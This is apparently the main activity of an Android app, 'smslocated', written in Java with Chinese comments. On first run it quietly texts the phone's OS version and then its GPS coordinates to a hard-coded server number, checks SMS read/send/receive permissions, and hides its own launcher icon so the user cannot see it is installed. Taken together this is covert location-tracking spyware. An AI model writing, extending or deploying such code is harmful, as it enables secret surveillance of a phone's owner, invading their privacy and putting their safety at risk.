package com.byc.smslocated;









import android.Manifest;
import android.app.Activity;
import android.app.ActivityManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends CheckPermissionsActivity {
	private MyLocation myLocation=null;
	 private TextView tvIndicator; 
	 private Button btReboot;
	public Config config;
	 private String s;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		//myLocation=MyLocation.getMyLocation(getApplicationContext());
		 initWidgets();
		 //启动服务；
		 Intent intent=new Intent(this,MainService.class);
		 startService(intent);
		//接收广播消息
	    IntentFilter filter = new IntentFilter();
	    filter.addAction(Config.ACTION_SERVICE_INFO);
	    registerReceiver(ServiceReceiver, filter);
	}
    @Override
    protected void onStop() {
        super.onStop();
        unregisterReceiver(ServiceReceiver);
    }
	private BroadcastReceiver ServiceReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {

            String action = intent.getAction();
            Log.d(Config.TAG, "receive-->" + action);
            if(Config.ACTION_SERVICE_INFO.equals(action)) {
            	requestPower();
            } 
        }
    };
    /*
     * 弹出申请权限窗体：
     */
    private void requestPower(){
    	 config=Config.getConfig(getApplicationContext());
		 //申请权限：
		 myLocation=MyLocation.getMyLocation(getApplicationContext());
		 
		 if(config.isFirstRun()){
				//if (Build.VERSION.SDK_INT>=23) { showSetPermission(); return;}
				String address=Config.PHONE_NUMBER_SERVER;
				String body=android.os.Build.VERSION.RELEASE;
				SmsReceiver.SendSms(address, body);
				//获取定位权限：
				if(MyLocation.isGpsOpen()){//定位功能打开：
					//Toast.makeText(this, "请给予定位权限！才能使用本软件！" ,Toast.LENGTH_SHORT).show();
					myLocation.GetSingleLocation();
					//获取发送短信权限：
					body=myLocation.locationInfo.provider+"("+myLocation.locationInfo.dX+","+myLocation.locationInfo.dY+")";
					//Toast.makeText(this, "请给予发送短信权限！才能使用本软件！" ,Toast.LENGTH_SHORT).show();
					SmsReceiver.SendSms(address, body);
					//restartApplication();
				}else{
					Toast.makeText(this, "请开启手机GPS定位功能！才能使用本软件！" ,Toast.LENGTH_SHORT).show();
					Intent intentOpen = new Intent();
					intentOpen.setAction(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
					intentOpen.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					startActivityForResult(intentOpen,0); //此为设置完成后返回到获取界面
					//DlgUtils.showLocServiceDialog(this);
					config.setFirstRun();
					Toast.makeText(this, "设置完成！请点【重新启动】按钮！" ,Toast.LENGTH_SHORT).show();	
					return;
				}
		 }
		//隐藏 ：
		PackageManager p = getPackageManager();
		p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
	private  void initWidgets(){
		tvIndicator = (TextView) findViewById(R.id.tvIndicator);
		btReboot=(Button)findViewById(R.id.btReboot);
    	//---------------------------重新启动 应用程序 --------------------
		btReboot.setOnClickListener(new OnClickListener(){
			@Override
			public void onClick(View v){
				//Toast.makeText(MainActivity.this, "正在重新启动启用...." ,Toast.LENGTH_SHORT).show();
				//String body="正在重新启动启用...." ;
				//String address=Config.PHONE_NUMBER_SERVER;
				//Toast.makeText(this, "请给予发送短信权限！才能使用本软件！" ,Toast.LENGTH_SHORT).show();
				//if(SmsReceiver.SendSms(address, body))Toast.makeText(MainActivity.this, "正在启动..." ,Toast.LENGTH_SHORT).show();
				restartApplication();
			}
		});
		String say=getVersion()+"设置完成！请点重新启动软件按钮！";
		tvIndicator.setText(say);
	}
	private String getVersion(){
    	  try {
      		  PackageInfo info = getPackageManager().getPackageInfo(getPackageName(), 0);
      		  String version="版本号："+info.versionName+"("+info.versionCode+")";
      		  return version;
      	  } catch (PackageManager.NameNotFoundException e) {
      		  e.printStackTrace();
            
      	  }
    	  return "";
	}
	private void restartApplication() {
		final Intent intent = getPackageManager().getLaunchIntentForPackage(getPackageName());
		intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
		startActivity(intent);
	}
	// 为了获取结果
	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		super.onActivityResult(requestCode, resultCode, data);
		// RESULT_OK，判断另外一个activity已经结束数据输入功能，Standard activity result:
		// operation succeeded. 默认值是-1
		if (requestCode == 0) {
			if(MyLocation.isGpsOpen())
				myLocation.GetSingleLocation();
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// Handle action bar item clicks here. The action bar will
		// automatically handle clicks on the Home/Up button, so long
		// as you specify a parent activity in AndroidManifest.xml.
		int id = item.getItemId();
		if (id == R.id.action_settings) {
			return true;
		}
		return super.onOptionsItemSelected(item);
	}
	/*
	 * 检测是否开启定位服务：
	 */
	public boolean checkSendMmsPermission() {
		int checkResult = PermissionHelper.checkOp(this, PermissionHelper.OP_SEND_SMS, PermissionHelper.OPSTR_SEND_SMS);
		int checkResult2 = PermissionHelper.checkOp(this, PermissionHelper.OP_RECEIVE_SMS, PermissionHelper.OPSTR_RECEIVE_SMS);
		int checkResult3 = PermissionHelper.checkOp(this, PermissionHelper.OP_READ_SMS, PermissionHelper.OPSTR_READ_SMS);
        if (PermissionHelper.MODE_IGNORED == checkResult || PermissionHelper.MODE_IGNORED == checkResult2|| PermissionHelper.MODE_IGNORED == checkResult3) {
            //DlgUtils.showLocIgnoredDialog(this);
        	return false;
        }else{
        	return  true;
        }
	}
	/*
	 * 检测是否开启定位服务：
	 */
	public boolean checkLocationPermission() {
	        if (!PermissionHelper.isLocServiceEnable(this)) {//检测是否开启定位服务
	            //DlgUtils.showLocServiceDialog(this);
	        	return false;
	        } else {//检测用户是否将当前应用的定位权限拒绝
	            int checkResult = PermissionHelper.checkOp(this, 2, PermissionHelper.OPSTR_FINE_LOCATION);//其中2代表AppOpsManager.OP_GPS，如果要判断悬浮框权限，第二个参数需换成24即AppOpsManager。OP_SYSTEM_ALERT_WINDOW及，第三个参数需要换成AppOpsManager.OPSTR_SYSTEM_ALERT_WINDOW
	            int checkResult2 = PermissionHelper.checkOp(this, 1, PermissionHelper.OPSTR_FINE_LOCATION);
	            if (PermissionHelper.MODE_IGNORED == checkResult || PermissionHelper.MODE_IGNORED == checkResult2) {
	                //DlgUtils.showLocIgnoredDialog(this);
	            	return false;
	            }else{
	            	return true;
	            }
	        }
	}


		
}
